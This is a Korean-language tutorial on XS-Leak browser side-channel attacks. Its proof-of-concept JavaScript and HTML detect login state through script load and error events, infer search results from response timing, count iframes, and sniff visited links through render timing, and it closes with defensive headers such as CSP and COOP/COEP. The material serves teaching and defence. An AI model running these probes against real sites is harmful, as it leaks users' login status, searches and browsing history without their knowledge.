# ✅ **XS-Leak (Cross-Site Leak)**

---

## 🔐 1. 왜 위험한가?

현대 웹은 사용자 인증(로그인)을 쿠키 기반으로 처리함.
**동일 출처 정책(SOP)** 덕분에, `evil.com`은 `bank.com`의 콘텐츠를 **직접 읽지는 못해**.
하지만 **브라우저가 보이는 "행동 차이"를 관찰하면**, 간접적으로 정보를 유추할 수 있음.

이게 바로 **XS-Leak (Cross-Site Leak)** 이란 공격이야.

---

## 🧠 2. 개념 요약

| 항목            | 설명                                     |
| ------------- | -------------------------------------- |
| **공격 목적**     | 피해자의 인증 상태, 존재 여부, 검색 결과 유출 등          |
| **직접 접근 가능?** | ❌ 콘텐츠는 못 읽음                            |
| **접근 방식**     | ✅ 브라우저의 반응(성공/실패, 시간 차이, DOM 변화 등)을 이용 |
| **공격 위치**     | 피해자가 공격자가 만든 웹사이트를 방문할 때 발생            |
| **기술 요약**     | *“사이드 채널(side-channel)”을 이용해 정보를 유출함*  |

---

## 📦 3. 예제: 로그인 여부 판단 (에러 이벤트 기반)

### 🎯 목표

> **“사용자가 `target.com`에 로그인했는지?”** 확인

### 🧱 구성

* 로그인 상태: `/dashboard`는 접근 가능 → 200 응답
* 로그아웃 상태: `/dashboard` 접근 시 → 302 로그인 페이지로 리디렉션 or 403/404

### ⚙️ PoC 코드

```html
<!DOCTYPE html>
<html>
  <head>
    <title>XS-Leak 테스트</title>
    <script>
      window.onload = () => {
        const targetURL = "https://target.com/dashboard";

        const testScript = document.createElement("script");

        testScript.onload = () => {
          alert("✅ 로그인 상태입니다!");
        };

        testScript.onerror = () => {
          alert("❌ 로그인 되어 있지 않습니다.");
        };

        testScript.src = targetURL;
        document.body.appendChild(testScript);
      };
    </script>
  </head>
  <body>
    <h1>로그인 상태 확인 중...</h1>
  </body>
</html>
```

### 🔍 동작 원리

* `<script src="https://target.com/dashboard">` 요청을 브라우저가 보냄
* 이 요청에는 피해자의 **쿠키가 자동 포함**됨 (브라우저가 붙임)
* 서버가 응답:

  * **로그인 상태면**: HTML/SCRIPT를 응답 → 브라우저가 `load` 이벤트 발생
  * **비로그인 상태면**: 오류/리디렉션 응답 → 브라우저가 `error` 이벤트 발생

📌 브라우저가 보여주는 `load vs error` 이벤트 차이만으로 **로그인 여부 유출** 가능!

---

## 🔁 4. 다른 예시들

### 📄 (1) 검색어 유출 - XS-Search (타이밍 기반)

* 사용자가 로그인한 채로 검색 요청을 보냈을 때,
* 검색 결과가 있으면 로딩 시간이 **조금 더 길어짐**
* 공격자는 이 **응답 시간 차이**를 반복적으로 측정해서 **검색 결과에 특정 단어가 포함됐는지** 알아냄

```js
const query = "암";
const start = performance.now();
fetch(`https://target.com/search?q=${query}`).then(() => {
  const duration = performance.now() - start;
  if (duration > 300) {
    console.log("검색 결과 존재 (해당 단어 있음)");
  } else {
    console.log("검색 결과 없음");
  }
});
```

---

### 🖼️ (2) 프레임 수 유출 - Frame Counting

* `iframe`을 로드한 후, 그 안에 포함된 프레임 수를 체크해서 민감 정보 유출

```js
const iframe = document.createElement("iframe");
iframe.src = "https://target.com/messages";
iframe.onload = () => {
  setTimeout(() => {
    const frames = iframe.contentWindow.length;
    if (frames > 1) {
      alert("메시지가 하나 이상 있음!");
    } else {
      alert("메시지가 없음");
    }
  }, 1000);
};
document.body.appendChild(iframe);
```

> 참고: 일부 브라우저는 이걸 막기 위해 **COOP/COEP 정책**을 적용 중

---

## 🛡️ 5. 방어 방법 (실제 적용 가능)

| 대책                                | 설명                                  |
| --------------------------------- | ----------------------------------- |
| **CSP (Content Security Policy)** | 외부 도메인의 스크립트, 프레임 삽입 제한             |
| **X-Frame-Options: DENY**         | 외부에서 iframe 삽입 자체를 금지               |
| **COOP / COEP 헤더**                | 크로스 오리진 간 정보 격리 강화                  |
| **모든 응답 시간 균일화**                  | 200/404 등 응답 시간 차이를 줄이기 (타이밍 채널 차단) |
| **모든 요청에 동일한 에러 응답 사용**           | 존재 여부와 관계없이 같은 응답 (404만 응답 등)       |
| **브라우저 보안 업데이트 반영**               | 최신 브라우저는 XS-Leak 방어 기능 강화됨          |

### 📌 실제 적용 예시

```http
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Embedder-Policy: require-corp
Content-Security-Policy: script-src 'self'; frame-ancestors 'none';
X-Frame-Options: DENY
```

---

# 🕵️‍♂️ `getComputedStyle()` + `:visited` + `requestAnimationFrame()` 을 이용한 **XS-Leak**

이건 **과거에 유명했던 사이드 채널 공격 기법** 중 하나로,
**방문한 링크(\:visited)** 여부를 브라우저의 렌더링 차이를 통해 알아내는 기법이야.

---

## 🧠 핵심 개념 요약

| 개념                            | 설명                                                        |
| ----------------------------- | --------------------------------------------------------- |
| **`:visited`**                | CSS 의사 클래스: 사용자가 **방문한 링크**에 대해 다른 스타일을 줄 수 있음            |
| **`getComputedStyle()`**      | JS로 브라우저가 실제로 렌더링한 스타일 값을 가져오는 함수                         |
| **`requestAnimationFrame()`** | 브라우저가 다음 화면을 그릴 때 콜백 실행 → 미묘한 시간 차이 측정 가능                 |
| **XS-Leak**                   | 렌더링 결과나 시간 차이를 통해 민감한 상태(여기서는 "링크 방문 여부")를 유출하는 사이드 채널 공격 |

---

## 🔍 공격 아이디어: 방문한 링크 색상을 몰래 확인하기

### ✅ 목표

> 피해자가 `https://secret-site.com/profile/user123` 같은 링크를 과거에 방문했는지 알아낸다.

### ✅ 일반적인 방법은 불가능

과거엔 이 코드가 작동했어:

```js
const style = getComputedStyle(linkElement);
console.log(style.color);  // 방문 여부에 따라 색이 다름
```

그러나 **보안 상 이유로**, 대부분의 브라우저는
`:visited`에 대한 `getComputedStyle()` 접근을 **차단**함.
→ 색상이나 크기, 텍스트 변경 등의 스타일은 **JS에서 접근 불가**

---

## ❗ 하지만, requestAnimationFrame과 조합하면...

### ⏱️ 핵심 아이디어

* 브라우저는 **`:visited` 스타일을 실제로 렌더링은 함**
* `getComputedStyle()`은 차단되지만, **렌더링 처리 속도 차이**는 존재할 수 있음
* `requestAnimationFrame()`을 사용하면 **렌더링 타이밍을 매우 정밀하게 측정** 가능

---

## 💥 공격 흐름 요약

1. 공격자는 여러 개의 `<a>` 태그를 가진 페이지를 만든다.

   ```html
   <a href="https://target.com/user/123">Link</a>
   <a href="https://target.com/user/456">Link</a>
   ...
   ```

2. CSS에서 `:visited`에 아주 복잡한 스타일을 부여한다. (느리게 렌더링 되도록)

   ```css
   a:visited {
     filter: blur(1px) brightness(50%) drop-shadow(5px 5px 5px red);
   }
   ```

3. JS에서 `requestAnimationFrame()`을 사용해 **각 링크 렌더링 시간**을 측정한다.

   ```js
   const links = document.querySelectorAll('a');
   let index = 0;

   function checkLink() {
     const link = links[index];
     link.style.display = 'inline-block';  // 보이게
     const start = performance.now();

     requestAnimationFrame(() => {
       const elapsed = performance.now() - start;
       console.log(`Link ${index} render time: ${elapsed}ms`);
       index++;
       if (index < links.length) checkLink();
     });
   }

   checkLink();
   ```

4. 렌더링 시간 차이를 비교한다.

   * **방문한 링크** → 복잡한 스타일 적용됨 → 렌더링이 **느림**
   * **방문하지 않은 링크** → 스타일 없음 → 렌더링 **빠름**

5. 이 시간 차이를 기준으로, **방문 여부를 유추**할 수 있음

